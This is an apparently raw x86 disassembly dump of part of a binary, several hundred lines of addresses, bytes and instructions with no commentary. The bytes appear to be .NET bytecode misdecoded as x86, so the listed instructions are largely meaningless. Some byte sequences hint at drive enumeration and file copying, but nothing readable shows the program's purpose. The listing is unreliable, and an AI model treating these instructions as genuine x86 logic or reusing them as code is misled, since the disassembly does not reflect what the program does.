  403c94:	58                   	pop    %eax
  403c95:	0c 08                	or     $0x8,%al
  403c97:	07                   	pop    %es
  403c98:	8e 69 32             	mov    0x32(%ecx),%gs
  403c9b:	ae                   	scas   %es:(%edi),%al
  403c9c:	de 03                	fiadds (%ebx)
  403c9e:	26 de 00             	fiadds %es:(%eax)
  403ca1:	2a 00                	sub    (%eax),%al
  403ca3:	00 01                	add    %al,(%ecx)
  403ca5:	1c 00                	sbb    $0x0,%al
  403ca7:	00 00                	add    %al,(%eax)
  403ca9:	00 49 00             	add    %cl,0x0(%ecx)
  403cac:	09 52 00             	or     %edx,0x0(%edx)
  403caf:	03 13                	add    (%ebx),%edx
  403cb1:	00 00                	add    %al,(%eax)
  403cb3:	01 00                	add    %eax,(%eax)
  403cb5:	00 00                	add    %al,(%eax)
  403cb7:	00 6e 6e             	add    %ch,0x6e(%esi)
  403cba:	00 03                	add    %al,(%ebx)
  403cbc:	13 00                	adc    (%eax),%eax
  403cbe:	00 01                	add    %al,(%ecx)
  403cc0:	1b 30                	sbb    (%eax),%esi
  403cc2:	02 00                	add    (%eax),%al
  403cc4:	1e                   	push   %ds
  403cc5:	00 00                	add    %al,(%eax)
  403cc7:	00 09                	add    %cl,(%ecx)
  403cc9:	00 00                	add    %al,(%eax)
  403ccb:	11 28                	adc    %ebp,(%eax)
  403ccd:	c7 00 00 0a 73 c8    	movl   $0xc8730a00,(%eax)
  403cd3:	00 00                	add    %al,(%eax)
  403cd5:	0a 20                	or     (%eax),%ah
  403cd7:	20 02                	and    %al,(%edx)
  403cd9:	00 00                	add    %al,(%eax)
  403cdb:	6f                   	outsl  %ds:(%esi),(%dx)
  403cdc:	c9                   	leave
  403cdd:	00 00                	add    %al,(%eax)
  403cdf:	0a 0a                	or     (%edx),%cl
  403ce1:	de 05 26 16 0a de    	fiadds 0xde0a1626
  403ce7:	00 06                	add    %al,(%esi)
  403ce9:	2a 00                	sub    (%eax),%al
  403ceb:	00 01                	add    %al,(%ecx)
  403ced:	10 00                	adc    %al,(%eax)
  403cef:	00 00                	add    %al,(%eax)
  403cf1:	00 00                	add    %al,(%eax)
  403cf3:	00 17                	add    %dl,(%edi)
  403cf5:	17                   	pop    %ss
  403cf6:	00 05 13 00 00 01    	add    %al,0x1000013
  403cfc:	f2 19 8d 57 00 00 01 	repnz sbb %ecx,0x1000057(%ebp)
  403d03:	25 16 1f 1a 28       	and    $0x281a1f16,%eax
  403d08:	2a 00                	sub    (%eax),%al
  403d0a:	00 0a                	add    %cl,(%edx)
  403d0c:	a2 25 17 1f 1c       	mov    %al,0x1c1f1725
  403d11:	28 2a                	sub    %ch,(%edx)
  403d13:	00 00                	add    %al,(%eax)
  403d15:	0a a2 25 18 28 90    	or     -0x6fd7e7db(%edx),%ah
  403d1b:	00 00                	add    %al,(%eax)
  403d1d:	0a a2 80 17 00 00    	or     0x1780(%edx),%ah
  403d23:	04 72                	add    $0x72,%al
  403d25:	10 15 00 70 80 18    	adc    %dl,0x18807000
  403d2b:	00 00                	add    %al,(%eax)
  403d2d:	04 73                	add    $0x73,%al
  403d2f:	3f                   	aas
  403d30:	00 00                	add    %al,(%eax)
  403d32:	0a 80 19 00 00 04    	or     0x4000019(%eax),%al
  403d38:	2a 00                	sub    (%eax),%al
  403d3a:	00 00                	add    %al,(%eax)
  403d3c:	13 30                	adc    (%eax),%esi
  403d3e:	02 00                	add    (%eax),%al
  403d40:	2f                   	das
  403d41:	00 00                	add    %al,(%eax)
  403d43:	00 25 00 00 11 12    	add    %ah,0x12110000
  403d49:	00 28                	add    %ch,(%eax)
  403d4b:	94                   	xchg   %eax,%esp
  403d4c:	00 00                	add    %al,(%eax)
  403d4e:	0a 7d 45             	or     0x45(%ebp),%bh
  403d51:	00 00                	add    %al,(%eax)
  403d53:	04 12                	add    $0x12,%al
  403d55:	00 15 7d 44 00 00    	add    %dl,0x447d
  403d5b:	04 12                	add    $0x12,%al
  403d5d:	00 7c 45 00          	add    %bh,0x0(%ebp,%eax,2)
  403d61:	00 04 12             	add    %al,(%edx,%edx,1)
  403d64:	00 28                	add    %ch,(%eax)
  403d66:	05 00 00 2b 12       	add    $0x122b0000,%eax
  403d6b:	00 7c 45 00          	add    %bh,0x0(%ebp,%eax,2)
  403d6f:	00 04 28             	add    %al,(%eax,%ebp,1)
  403d72:	96                   	xchg   %eax,%esi
  403d73:	00 00                	add    %al,(%eax)
  403d75:	0a 2a                	or     (%edx),%ch
  403d77:	2e 73 3f             	jae,pn 0x403db9
  403d7a:	00 00                	add    %al,(%eax)
  403d7c:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  403d82:	2a 00                	sub    (%eax),%al
  403d84:	13 30                	adc    (%eax),%esi
  403d86:	01 00                	add    %eax,(%eax)
  403d88:	13 00                	adc    (%eax),%eax
  403d8a:	00 00                	add    %al,(%eax)
  403d8c:	26 00 00             	add    %al,%es:(%eax)
  403d8f:	11 28                	adc    %ebp,(%eax)
  403d91:	4a                   	dec    %edx
  403d92:	00 00                	add    %al,(%eax)
  403d94:	06                   	push   %es
  403d95:	6f                   	outsl  %ds:(%esi),(%dx)
  403d96:	ca 00 00             	lret   $0x0
  403d99:	0a 0a                	or     (%edx),%cl
  403d9b:	12 00                	adc    (%eax),%al
  403d9d:	28 cb                	sub    %cl,%bl
  403d9f:	00 00                	add    %al,(%eax)
  403da1:	0a 2a                	or     (%edx),%ch
  403da3:	00 1b                	add    %bl,(%ebx)
  403da5:	30 03                	xor    %al,(%ebx)
  403da7:	00 98 00 00 00 27    	add    %bl,0x27000000(%eax)
  403dad:	00 00                	add    %al,(%eax)
  403daf:	11 28                	adc    %ebp,(%eax)
  403db1:	31 00                	xor    %eax,(%eax)
  403db3:	00 0a                	add    %cl,(%edx)
  403db5:	6f                   	outsl  %ds:(%esi),(%dx)
  403db6:	32 00                	xor    (%eax),%al
  403db8:	00 0a                	add    %cl,(%edx)
  403dba:	6f                   	outsl  %ds:(%esi),(%dx)
  403dbb:	33 00                	xor    (%eax),%eax
  403dbd:	00 0a                	add    %cl,(%edx)
  403dbf:	0a 7e 1b             	or     0x1b(%esi),%bh
  403dc2:	00 00                	add    %al,(%eax)
  403dc4:	04 0b                	add    $0xb,%al
  403dc6:	16                   	push   %ss
  403dc7:	0c 2b                	or     $0x2b,%al
  403dc9:	77 07                	ja     0x403dd2
  403dcb:	08 9a 0d 06 09 28    	or     %bl,0x2809060d(%edx)
  403dd1:	4e                   	dec    %esi
  403dd2:	00 00                	add    %al,(%eax)
  403dd4:	06                   	push   %es
  403dd5:	2c 02                	sub    $0x2,%al
  403dd7:	de 6e 09             	fisubrs 0x9(%esi)
  403dda:	28 24 00             	sub    %ah,(%eax,%eax,1)
  403ddd:	00 0a                	add    %cl,(%edx)
  403ddf:	2c 2b                	sub    $0x2b,%al
  403de1:	06                   	push   %es
  403de2:	73 cc                	jae    0x403db0
  403de4:	00 00                	add    %al,(%eax)
  403de6:	0a 09                	or     (%ecx),%cl
  403de8:	73 cc                	jae    0x403db6
  403dea:	00 00                	add    %al,(%eax)
  403dec:	0a 13                	or     (%ebx),%dl
  403dee:	04 6f                	add    $0x6f,%al
  403df0:	cd 00                	int    $0x0
  403df2:	00 0a                	add    %cl,(%edx)
  403df4:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  403df7:	cd 00                	int    $0x0
  403df9:	00 0a                	add    %cl,(%edx)
  403dfb:	33 0f                	xor    (%edi),%ecx
  403dfd:	09 28                	or     %ebp,(%eax)
  403dff:	44                   	inc    %esp
  403e00:	00 00                	add    %al,(%eax)
  403e02:	0a 26                	or     (%esi),%ah
  403e04:	16                   	push   %ss
  403e05:	28 ce                	sub    %cl,%dh
  403e07:	00 00                	add    %al,(%eax)
  403e09:	0a de                	or     %dh,%bl
  403e0b:	3b 06                	cmp    (%esi),%eax
  403e0d:	09 17                	or     %edx,(%edi)
  403e0f:	28 cf                	sub    %cl,%bh
  403e11:	00 00                	add    %al,(%eax)
  403e13:	0a 09                	or     (%ecx),%cl
  403e15:	1c 28                	sbb    $0x28,%al
  403e17:	c4 00                	les    (%eax),%eax
  403e19:	00 0a                	add    %cl,(%edx)
  403e1b:	09 28                	or     %ebp,(%eax)
  403e1d:	44                   	inc    %esp
  403e1e:	00 00                	add    %al,(%eax)
  403e20:	0a 26                	or     (%esi),%ah
  403e22:	16                   	push   %ss
  403e23:	28 ce                	sub    %cl,%dh
  403e25:	00 00                	add    %al,(%eax)
  403e27:	0a de                	or     %dh,%bl
  403e29:	13 26                	adc    (%esi),%esp
  403e2b:	20 2c 01             	and    %ch,(%ecx,%eax,1)
  403e2e:	00 00                	add    %al,(%eax)
  403e30:	28 3a                	sub    %bh,(%edx)
  403e32:	00 00                	add    %al,(%eax)
  403e34:	0a de                	or     %dh,%bl
  403e36:	06                   	push   %es
  403e37:	26 de 03             	fiadds %es:(%ebx)
  403e3a:	26 de 00             	fiadds %es:(%eax)
  403e3d:	08 17                	or     %dl,(%edi)
  403e3f:	58                   	pop    %eax
  403e40:	0c 08                	or     $0x8,%al
  403e42:	07                   	pop    %es
  403e43:	8e 69 32             	mov    0x32(%ecx),%gs
  403e46:	83 2a 01             	subl   $0x1,(%edx)
  403e49:	28 00                	sub    %al,(%eax)
  403e4b:	00 00                	add    %al,(%eax)
  403e4d:	00 1e                	add    %bl,(%esi)
  403e4f:	00 5c 7a 00          	add    %bl,0x0(%edx,%edi,2)
  403e53:	0d 40 00 00 01       	or     $0x1000040,%eax
  403e58:	00 00                	add    %al,(%eax)
  403e5a:	1e                   	push   %ds
  403e5b:	00 5c 87 00          	add    %bl,0x0(%edi,%eax,4)
  403e5f:	03 41 00             	add    0x0(%ecx),%eax
  403e62:	00 01                	add    %al,(%ecx)
  403e64:	00 00                	add    %al,(%eax)
  403e66:	1e                   	push   %ds
  403e67:	00 5c 8a 00          	add    %bl,0x0(%edx,%ecx,4)
  403e6b:	03 13                	add    (%ebx),%edx
  403e6d:	00 00                	add    %al,(%eax)
  403e6f:	01 ce                	add    %ecx,%esi
  403e71:	02 28                	add    (%eax),%ch
  403e73:	d0 00                	rolb   $1,(%eax)
  403e75:	00 0a                	add    %cl,(%edx)
  403e77:	17                   	pop    %ss
  403e78:	8d 74 00 00          	lea    0x0(%eax,%eax,1),%esi
  403e7c:	01 25 16 1f 5c 9d    	add    %esp,0x9d5c1f16
  403e82:	6f                   	outsl  %ds:(%esi),(%dx)
  403e83:	d1 00                	roll   $1,(%eax)
  403e85:	00 0a                	add    %cl,(%edx)
  403e87:	03 28                	add    (%eax),%ebp
  403e89:	d0 00                	rolb   $1,(%eax)
  403e8b:	00 0a                	add    %cl,(%edx)
  403e8d:	17                   	pop    %ss
  403e8e:	8d 74 00 00          	lea    0x0(%eax,%eax,1),%esi
  403e92:	01 25 16 1f 5c 9d    	add    %esp,0x9d5c1f16
  403e98:	6f                   	outsl  %ds:(%esi),(%dx)
  403e99:	d1 00                	roll   $1,(%eax)
  403e9b:	00 0a                	add    %cl,(%edx)
  403e9d:	1b 28                	sbb    (%eax),%ebp
  403e9f:	d2 00                	rolb   %cl,(%eax)
  403ea1:	00 0a                	add    %cl,(%edx)
  403ea3:	2a 13                	sub    (%ebx),%dl
  403ea5:	30 05 00 46 00 00    	xor    %al,0x4600
  403eab:	00 00                	add    %al,(%eax)
  403ead:	00 00                	add    %al,(%eax)
  403eaf:	00 19                	add    %bl,(%ecx)
  403eb1:	8d 57 00             	lea    0x0(%edi),%edx
  403eb4:	00 01                	add    %al,(%ecx)
  403eb6:	25 16 1f 1a 28       	and    $0x281a1f16,%eax
  403ebb:	2a 00                	sub    (%eax),%al
  403ebd:	00 0a                	add    %cl,(%edx)
  403ebf:	72 2a                	jb     0x403eeb
  403ec1:	15 00 70 28 2b       	adc    $0x2b287000,%eax
  403ec6:	00 00                	add    %al,(%eax)
  403ec8:	0a a2 25 17 28 90    	or     -0x6fd7e8db(%edx),%ah
  403ece:	00 00                	add    %al,(%eax)
  403ed0:	0a 72 2a             	or     0x2a(%edx),%dh
  403ed3:	15 00 70 28 2b       	adc    $0x2b287000,%eax
  403ed8:	00 00                	add    %al,(%eax)
  403eda:	0a a2 25 18 1f 1c    	or     0x1c1f1825(%edx),%ah
  403ee0:	28 2a                	sub    %ch,(%edx)
  403ee2:	00 00                	add    %al,(%eax)
  403ee4:	0a 72 2a             	or     0x2a(%edx),%dh
  403ee7:	15 00 70 28 2b       	adc    $0x2b287000,%eax
  403eec:	00 00                	add    %al,(%eax)
  403eee:	0a a2 80 1b 00 00    	or     0x1b80(%edx),%ah
  403ef4:	04 2a                	add    $0x2a,%al
  403ef6:	00 00                	add    %al,(%eax)
  403ef8:	13 30                	adc    (%eax),%esi
  403efa:	02 00                	add    (%eax),%al
  403efc:	48                   	dec    %eax
  403efd:	00 00                	add    %al,(%eax)
  403eff:	00 00                	add    %al,(%eax)
  403f01:	00 00                	add    %al,(%eax)
  403f03:	00 7e 1d             	add    %bh,0x1d(%esi)
  403f06:	00 00                	add    %al,(%eax)
  403f08:	04 2c                	add    $0x2c,%al
  403f0a:	01 2a                	add    %ebp,(%edx)
  403f0c:	17                   	pop    %ss
  403f0d:	80 1d 00 00 04 73 bf 	sbbb   $0xbf,0x73040000
  403f14:	00 00                	add    %al,(%eax)
  403f16:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  403f1c:	7e 48                	jle    0x403f66
  403f1e:	00 00                	add    %al,(%eax)
  403f20:	04 25                	add    $0x25,%al
  403f22:	2d 17 26 7e 47       	sub    $0x477e2617,%eax
  403f27:	00 00                	add    %al,(%eax)
  403f29:	04 fe                	add    $0xfe,%al
  403f2b:	06                   	push   %es
  403f2c:	7c 00                	jl     0x403f2e
  403f2e:	00 06                	add    %al,(%esi)
  403f30:	73 d3                	jae    0x403f05
  403f32:	00 00                	add    %al,(%eax)
  403f34:	0a 25 80 48 00 00    	or     0x4880,%ah
  403f3a:	04 7e                	add    $0x7e,%al
  403f3c:	1e                   	push   %ds
  403f3d:	00 00                	add    %al,(%eax)
  403f3f:	04 6f                	add    $0x6f,%al
  403f41:	d4 00                	aam    $0x0
  403f43:	00 0a                	add    %cl,(%edx)
  403f45:	28 d5                	sub    %dl,%ch
  403f47:	00 00                	add    %al,(%eax)
  403f49:	0a 26                	or     (%esi),%ah
  403f4b:	2a 66 7e             	sub    0x7e(%esi),%ah
  403f4e:	1d 00 00 04 2d       	sbb    $0x2d040000,%eax
  403f53:	01 2a                	add    %ebp,(%edx)
  403f55:	7e 1e                	jle    0x403f75
  403f57:	00 00                	add    %al,(%eax)
  403f59:	04 6f                	add    $0x6f,%al
  403f5b:	be 00 00 0a 16       	mov    $0x160a0000,%esi
  403f60:	80 1d 00 00 04 2a 00 	sbbb   $0x0,0x2a040000
  403f67:	00 13                	add    %dl,(%ebx)
  403f69:	30 02                	xor    %al,(%edx)
  403f6b:	00 2f                	add    %ch,(%edi)
  403f6d:	00 00                	add    %al,(%eax)
  403f6f:	00 28                	add    %ch,(%eax)
  403f71:	00 00                	add    %al,(%eax)
  403f73:	11 12                	adc    %edx,(%edx)
  403f75:	00 28                	add    %ch,(%eax)
  403f77:	94                   	xchg   %eax,%esp
  403f78:	00 00                	add    %al,(%eax)
  403f7a:	0a 7d 4a             	or     0x4a(%ebp),%bh
  403f7d:	00 00                	add    %al,(%eax)
  403f7f:	04 12                	add    $0x12,%al
  403f81:	00 15 7d 49 00 00    	add    %dl,0x497d
  403f87:	04 12                	add    $0x12,%al
  403f89:	00 7c 4a 00          	add    %bh,0x0(%edx,%ecx,2)
  403f8d:	00 04 12             	add    %al,(%edx,%edx,1)
  403f90:	00 28                	add    %ch,(%eax)
  403f92:	06                   	push   %es
  403f93:	00 00                	add    %al,(%eax)
  403f95:	2b 12                	sub    (%edx),%edx
  403f97:	00 7c 4a 00          	add    %bh,0x0(%edx,%ecx,2)
  403f9b:	00 04 28             	add    %al,(%eax,%ebp,1)
  403f9e:	96                   	xchg   %eax,%esi
  403f9f:	00 00                	add    %al,(%eax)
  403fa1:	0a 2a                	or     (%edx),%ch
  403fa3:	00 1b                	add    %bl,(%ebx)
  403fa5:	30 01                	xor    %al,(%ecx)
  403fa7:	00 17                	add    %dl,(%edi)
  403fa9:	00 00                	add    %al,(%eax)
  403fab:	00 00                	add    %al,(%eax)
  403fad:	00 00                	add    %al,(%eax)
  403faf:	00 1b                	add    %bl,(%ebx)
  403fb1:	28 d6                	sub    %dl,%dh
  403fb3:	00 00                	add    %al,(%eax)
  403fb5:	0a 02                	or     (%edx),%al
  403fb7:	28 d7                	sub    %dl,%bh
  403fb9:	00 00                	add    %al,(%eax)
  403fbb:	0a 28                	or     (%eax),%ch
  403fbd:	d8 00                	fadds  (%eax)
  403fbf:	00 0a                	add    %cl,(%edx)
  403fc1:	de 03                	fiadds (%ebx)
  403fc3:	26 de 00             	fiadds %es:(%eax)
  403fc6:	2a 00                	sub    (%eax),%al
  403fc8:	01 10                	add    %edx,(%eax)
  403fca:	00 00                	add    %al,(%eax)
  403fcc:	00 00                	add    %al,(%eax)
  403fce:	00 00                	add    %al,(%eax)
  403fd0:	13 13                	adc    (%ebx),%edx
  403fd2:	00 03                	add    %al,(%ebx)
  403fd4:	13 00                	adc    (%eax),%eax
  403fd6:	00 01                	add    %al,(%ecx)
  403fd8:	46                   	inc    %esi
  403fd9:	73 3f                	jae    0x40401a
  403fdb:	00 00                	add    %al,(%eax)
  403fdd:	0a 80 1c 00 00 04    	or     0x400001c(%eax),%al
  403fe3:	16                   	push   %ss
  403fe4:	80 1d 00 00 04 2a 00 	sbbb   $0x0,0x2a040000
  403feb:	00 13                	add    %dl,(%ebx)
  403fed:	30 02                	xor    %al,(%edx)
  403fef:	00 42 00             	add    %al,0x0(%edx)
  403ff2:	00 00                	add    %al,(%eax)
  403ff4:	00 00                	add    %al,(%eax)
  403ff6:	00 00                	add    %al,(%eax)
  403ff8:	7e 22                	jle    0x40401c
  403ffa:	00 00                	add    %al,(%eax)
  403ffc:	04 2c                	add    $0x2c,%al
  403ffe:	01 2a                	add    %ebp,(%edx)
  404000:	73 bf                	jae    0x403fc1
  404002:	00 00                	add    %al,(%eax)
  404004:	0a 80 22 00 00 04    	or     0x4000022(%eax),%al
  40400a:	7e 4f                	jle    0x40405b
  40400c:	00 00                	add    %al,(%eax)
  40400e:	04 25                	add    $0x25,%al
  404010:	2d 17 26 7e 4e       	sub    $0x4e7e2617,%eax
  404015:	00 00                	add    %al,(%eax)
  404017:	04 fe                	add    $0xfe,%al
  404019:	06                   	push   %es
  40401a:	81 00 00 06 73 d3    	addl   $0xd3730600,(%eax)
  404020:	00 00                	add    %al,(%eax)
  404022:	0a 25 80 4f 00 00    	or     0x4f80,%ah
  404028:	04 7e                	add    $0x7e,%al
  40402a:	22 00                	and    (%eax),%al
  40402c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40402f:	d4 00                	aam    $0x0
  404031:	00 0a                	add    %cl,(%edx)
  404033:	28 d5                	sub    %dl,%ch
  404035:	00 00                	add    %al,(%eax)
  404037:	0a 26                	or     (%esi),%ah
  404039:	2a 66 7e             	sub    0x7e(%esi),%ah
  40403c:	22 00                	and    (%eax),%al
  40403e:	00 04 2d 01 2a 7e 22 	add    %al,0x227e2a01(,%ebp,1)
  404045:	00 00                	add    %al,(%eax)
  404047:	04 6f                	add    $0x6f,%al
  404049:	be 00 00 0a 14       	mov    $0x140a0000,%esi
  40404e:	80 22 00             	andb   $0x0,(%edx)
  404051:	00 04 2a             	add    %al,(%edx,%ebp,1)
  404054:	13 30                	adc    (%eax),%esi
  404056:	02 00                	add    (%eax),%al
  404058:	2f                   	das
  404059:	00 00                	add    %al,(%eax)
  40405b:	00 29                	add    %ch,(%ecx)
  40405d:	00 00                	add    %al,(%eax)
  40405f:	11 12                	adc    %edx,(%edx)
  404061:	00 28                	add    %ch,(%eax)
  404063:	94                   	xchg   %eax,%esp
  404064:	00 00                	add    %al,(%eax)
  404066:	0a 7d 52             	or     0x52(%ebp),%bh
  404069:	00 00                	add    %al,(%eax)
  40406b:	04 12                	add    $0x12,%al
  40406d:	00 15 7d 51 00 00    	add    %dl,0x517d
  404073:	04 12                	add    $0x12,%al
  404075:	00 7c 52 00          	add    %bh,0x0(%edx,%edx,2)
  404079:	00 04 12             	add    %al,(%edx,%edx,1)
  40407c:	00 28                	add    %ch,(%eax)
  40407e:	07                   	pop    %es
  40407f:	00 00                	add    %al,(%eax)
  404081:	2b 12                	sub    (%edx),%edx
  404083:	00 7c 52 00          	add    %bh,0x0(%edx,%edx,2)
  404087:	00 04 28             	add    %al,(%eax,%ebp,1)
  40408a:	96                   	xchg   %eax,%esi
  40408b:	00 00                	add    %al,(%eax)
  40408d:	0a 2a                	or     (%edx),%ch
  40408f:	00 1b                	add    %bl,(%ebx)
  404091:	30 05 00 57 00 00    	xor    %al,0x5700
  404097:	00 2a                	add    %ch,(%edx)
  404099:	00 00                	add    %al,(%eax)
  40409b:	11 02                	adc    %eax,(%edx)
  40409d:	8d 74 00 00          	lea    0x0(%eax,%eax,1),%esi
  4040a1:	01 0a                	add    %ecx,(%edx)
  4040a3:	7e 20                	jle    0x4040c5
  4040a5:	00 00                	add    %al,(%eax)
  4040a7:	04 0b                	add    $0xb,%al
  4040a9:	16                   	push   %ss
  4040aa:	0c 07                	or     $0x7,%al
  4040ac:	12 02                	adc    (%edx),%al
  4040ae:	28 d9                	sub    %bl,%cl
  4040b0:	00 00                	add    %al,(%eax)
  4040b2:	0a 16                	or     (%esi),%dl
  4040b4:	0d 2b 25 06 09       	or     $0x906252b,%eax
  4040b9:	72 40                	jb     0x4040fb
  4040bb:	15 00 70 7e 20       	adc    $0x207e7000,%eax
  4040c0:	00 00                	add    %al,(%eax)
  4040c2:	04 72                	add    $0x72,%al
  4040c4:	40                   	inc    %eax
  4040c5:	15 00 70 28 41       	adc    $0x41287000,%eax
  4040ca:	00 00                	add    %al,(%eax)
  4040cc:	0a 6f c0             	or     -0x40(%edi),%ch
  4040cf:	00 00                	add    %al,(%eax)
  4040d1:	0a 28                	or     (%eax),%ch
  4040d3:	c1 00 00             	roll   $0x0,(%eax)
  4040d6:	0a 9d 09 17 58 0d    	or     0xd581709(%ebp),%bl
  4040dc:	09 02                	or     %eax,(%edx)
  4040de:	32 d7                	xor    %bh,%dl
  4040e0:	de 0a                	fimuls (%edx)
  4040e2:	08 2c 06             	or     %ch,(%esi,%eax,1)
  4040e5:	07                   	pop    %es
  4040e6:	28 da                	sub    %bl,%dl
  4040e8:	00 00                	add    %al,(%eax)
  4040ea:	0a dc                	or     %ah,%bl
  4040ec:	06                   	push   %es
  4040ed:	73 c2                	jae    0x4040b1
  4040ef:	00 00                	add    %al,(%eax)
  4040f1:	0a 2a                	or     (%edx),%ch
  4040f3:	00 01                	add    %al,(%ecx)
  4040f5:	10 00                	adc    %al,(%eax)
  4040f7:	00 02                	add    %al,(%edx)
  4040f9:	00 0f                	add    %cl,(%edi)
  4040fb:	00 37                	add    %dh,(%edi)
  4040fd:	46                   	inc    %esi
  4040fe:	00 0a                	add    %cl,(%edx)
  404100:	00 00                	add    %al,(%eax)
  404102:	00 00                	add    %al,(%eax)
  404104:	1b 30                	sbb    (%eax),%esi
  404106:	01 00                	add    %eax,(%eax)
  404108:	17                   	pop    %ss
  404109:	00 00                	add    %al,(%eax)
  40410b:	00 00                	add    %al,(%eax)
  40410d:	00 00                	add    %al,(%eax)
  40410f:	00 18                	add    %bl,(%eax)
  404111:	28 d6                	sub    %dl,%dh
  404113:	00 00                	add    %al,(%eax)
  404115:	0a 02                	or     (%edx),%al
  404117:	28 d7                	sub    %dl,%bh
  404119:	00 00                	add    %al,(%eax)
  40411b:	0a 28                	or     (%eax),%ch
  40411d:	d8 00                	fadds  (%eax)
  40411f:	00 0a                	add    %cl,(%edx)
  404121:	de 03                	fiadds (%ebx)
  404123:	26 de 00             	fiadds %es:(%eax)
  404126:	2a 00                	sub    (%eax),%al
  404128:	01 10                	add    %edx,(%eax)
  40412a:	00 00                	add    %al,(%eax)
  40412c:	00 00                	add    %al,(%eax)
  40412e:	00 00                	add    %al,(%eax)
  404130:	13 13                	adc    (%ebx),%edx
  404132:	00 03                	add    %al,(%ebx)
  404134:	13 00                	adc    (%eax),%eax
  404136:	00 01                	add    %al,(%ecx)
  404138:	13 30                	adc    (%eax),%esi
  40413a:	05 00 50 00 00       	add    $0x5000,%eax
  40413f:	00 00                	add    %al,(%eax)
  404141:	00 00                	add    %al,(%eax)
  404143:	00 28                	add    %ch,(%eax)
  404145:	31 00                	xor    %eax,(%eax)
  404147:	00 0a                	add    %cl,(%edx)
  404149:	6f                   	outsl  %ds:(%esi),(%dx)
  40414a:	32 00                	xor    (%eax),%al
  40414c:	00 0a                	add    %cl,(%edx)
  40414e:	6f                   	outsl  %ds:(%esi),(%dx)
  40414f:	33 00                	xor    (%eax),%eax
  404151:	00 0a                	add    %cl,(%edx)
  404153:	80 1f 00             	sbbb   $0x0,(%edi)
  404156:	00 04 73             	add    %al,(%ebx,%esi,2)
  404159:	3f                   	aas
  40415a:	00 00                	add    %al,(%eax)
  40415c:	0a 80 20 00 00 04    	or     0x4000020(%eax),%al
  404162:	19 8d 57 00 00 01    	sbb    %ecx,0x1000057(%ebp)
  404168:	25 16 16 28 2a       	and    $0x2a281616,%eax
  40416d:	00 00                	add    %al,(%eax)
  40416f:	0a a2 25 17 1f 28    	or     0x281f1725(%edx),%ah
  404175:	28 2a                	sub    %ch,(%edx)
  404177:	00 00                	add    %al,(%eax)
  404179:	0a 72 72             	or     0x72(%edx),%dh
  40417c:	13 00                	adc    (%eax),%eax
  40417e:	70 28                	jo     0x4041a8
  404180:	2b 00                	sub    (%eax),%eax
  404182:	00 0a                	add    %cl,(%edx)
  404184:	a2 25 18 1b 28       	mov    %al,0x281b1825
  404189:	2a 00                	sub    (%eax),%al
  40418b:	00 0a                	add    %cl,(%edx)
  40418d:	a2 80 21 00 00       	mov    %al,0x2180
  404192:	04 2a                	add    $0x2a,%al
  404194:	1b 30                	sbb    (%eax),%esi
  404196:	03 00                	add    (%eax),%eax
  404198:	95                   	xchg   %eax,%ebp
  404199:	00 00                	add    %al,(%eax)
  40419b:	00 2b                	add    %ch,(%ebx)
  40419d:	00 00                	add    %al,(%eax)
  40419f:	11 28                	adc    %ebp,(%eax)
  4041a1:	31 00                	xor    %eax,(%eax)
  4041a3:	00 0a                	add    %cl,(%edx)
  4041a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4041a6:	32 00                	xor    (%eax),%al
  4041a8:	00 0a                	add    %cl,(%edx)
  4041aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4041ab:	33 00                	xor    (%eax),%eax
  4041ad:	00 0a                	add    %cl,(%edx)
  4041af:	0a 28                	or     (%eax),%ch
  4041b1:	db 00                	fildl  (%eax)
  4041b3:	00 0a                	add    %cl,(%edx)
  4041b5:	0b 16                	or     (%esi),%edx
  4041b7:	0c 2b                	or     $0x2b,%al
  4041b9:	74 07                	je     0x4041c2
  4041bb:	08 9a 0d 09 6f dc    	or     %bl,-0x2390f6f3(%edx)
  4041c1:	00 00                	add    %al,(%eax)
  4041c3:	0a 2c 5f             	or     (%edi,%ebx,2),%ch
  4041c6:	09 6f dd             	or     %ebp,-0x23(%edi)
  4041c9:	00 00                	add    %al,(%eax)
  4041cb:	0a 18                	or     (%eax),%bl
  4041cd:	33 56 09             	xor    0x9(%esi),%edx
  4041d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d1:	de 00                	fiadds (%eax)
  4041d3:	00 0a                	add    %cl,(%edx)
  4041d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d6:	df 00                	filds  (%eax)
  4041d8:	00 0a                	add    %cl,(%edx)
  4041da:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4041dd:	04 72                	add    $0x72,%al
  4041df:	be 15 00 70 28       	mov    $0x28700015,%esi
  4041e4:	2b 00                	sub    (%eax),%eax
  4041e6:	00 0a                	add    %cl,(%edx)
  4041e8:	13 05 11 05 28 24    	adc    0x24280511,%eax
  4041ee:	00 00                	add    %al,(%eax)
  4041f0:	0a 2d 10 06 11 05    	or     0x5110610,%ch
  4041f6:	28 c3                	sub    %al,%bl
  4041f8:	00 00                	add    %al,(%eax)
  4041fa:	0a 11                	or     (%ecx),%dl
  4041fc:	05 1c 28 c4 00       	add    $0xc4281c,%eax
  404201:	00 0a                	add    %cl,(%edx)
  404203:	11 04 72             	adc    %eax,(%edx,%esi,2)
  404206:	da 15 00 70 28 2b    	ficoml 0x2b287000
  40420c:	00 00                	add    %al,(%eax)
  40420e:	0a 13                	or     (%ebx),%dl
  404210:	06                   	push   %es
  404211:	11 06                	adc    %eax,(%esi)
  404213:	28 24 00             	sub    %ah,(%eax,%eax,1)
  404216:	00 0a                	add    %cl,(%edx)
  404218:	2d 0b 11 06 11       	sub    $0x1106110b,%eax
  40421d:	05 11 04 28 5c       	add    $0x5c280411,%eax
  404222:	00 00                	add    %al,(%eax)
  404224:	06                   	push   %es
  404225:	de 03                	fiadds (%ebx)
  404227:	26 de 00             	fiadds %es:(%eax)
  40422a:	08 17                	or     %dl,(%edi)
  40422c:	58                   	pop    %eax
  40422d:	0c 08                	or     $0x8,%al
  40422f:	07                   	pop    %es
  404230:	8e 69 32             	mov    0x32(%ecx),%gs
  404233:	86 2a                	xchg   %ch,(%edx)
  404235:	00 00                	add    %al,(%eax)
  404237:	00 01                	add    %al,(%ecx)
  404239:	10 00                	adc    %al,(%eax)
  40423b:	00 00                	add    %al,(%eax)
  40423d:	00 1e                	add    %bl,(%esi)
  40423f:	00 69 87             	add    %ch,-0x79(%ecx)
  404242:	00 03                	add    %al,(%ebx)
